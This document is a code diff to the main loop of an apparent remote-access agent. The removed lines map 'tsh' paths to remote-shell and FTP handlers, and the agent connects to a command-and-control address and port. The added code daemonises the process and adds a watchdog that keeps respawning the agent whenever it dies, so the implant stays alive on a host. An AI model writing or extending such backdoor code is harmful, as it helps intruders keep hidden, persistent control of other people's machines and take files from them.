@@ -1,60 +1,83 @@
 #include <iostream>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
 #include "../../lib/agent/Agent.h"
 #include "../../setting.h"
 
-string                webRoot = "tsh";
-std::map<string, int> CC_URL  = {
-    {webRoot + "/rshell", 1},
-    {webRoot + "/ftp", 2},
-    {"", 3},
-};
-enum ReturnNum {
-    SUCCESS = -100,
-    ERROR,
-    CLOSE,
-};
-
 int main() {
-    // init httpserver
-    HttpServer* agent = new HttpServer(cc_ip, cc_port, file_port);
+    int pid;
+    // 1. fork into background
+#ifdef AGENT_BACK
+    pid = fork();
 
-    fd_set rd;
-    int    ret;
-    int    shellFd = agent->get_shellFd();
-    int    fileFd  = agent->get_fileFd();
+    if (pid < 0) {
+        return -1;
+    }
 
-    // file manager
-    // temporarily monitored and managed by the main thread
-    while (1) {
-        FD_SET(fileFd, &rd);
+    if (pid > 0) {
+        return 0;
+    }
 
-        if (select(fileFd + 1, &rd, NULL, NULL, NULL) < 0)
-            return -1;
-#if 0
-        if ( FD_ISSET( shellFd, &rd ) )
-        {
-            //
-        }
+    if (setsid() < 0) {
+        return -1;
+    }
+
+    for (int n = 0; n < 1024; n++) {
+        close(n);
+    }
 #endif
-        if (FD_ISSET(fileFd, &rd)) {
-            HttpRequest* httphandler = new HttpRequest(fileFd);
 
-            switch (agent->_events_CC_readable(httphandler)) {
-                case SUCCESS:
-                    break;
+    // 2. fork into health check
+    pid = fork();
 
-                case CLOSE:
+    if (pid < 0) {
+        return -1;
+    }
 
-                    break;
-                case ERROR:
+    // 3. run a httpserver
+    if (pid == 0) {
+        HttpServer* agent = new HttpServer(cc_ip, cc_port, file_port);
 
-                    break;
+        // handle error from threads
+        while (1) {
+            std::unique_lock<std::mutex> lock(agent->lock_);
+
+            while (agent->healthy_) {
+                agent->iskill_conn.wait(lock);
             }
 
-            string path = httphandler->getQuery();
+            delete agent;
+            kill(getpid(), SIGTERM);
+        }
+    }
 
-            FileManager::getInstance()->File_pushJob(
-                std::bind(agent->getfile_, httphandler, path));
+    // 4. health check
+    else if (pid > 0) {
+        while (1) {
+            waitpid(pid, NULL, WUNTRACED);
+
+            pid = fork();
+
+            if (pid < 0) {
+                return -1;
+            }
+
+            if (pid == 0) {
+                HttpServer* agent =
+                    new HttpServer(cc_ip, cc_port, file_port);
+                while (1) {
+                    std::unique_lock<std::mutex> lock(agent->lock_);
+
+                    while (agent->healthy_) {
+                        agent->iskill_conn.wait(lock);
+                    }
+
+                    delete agent;
+                    kill(getpid(), SIGTERM);
+                }
+            }
         }
     }
 
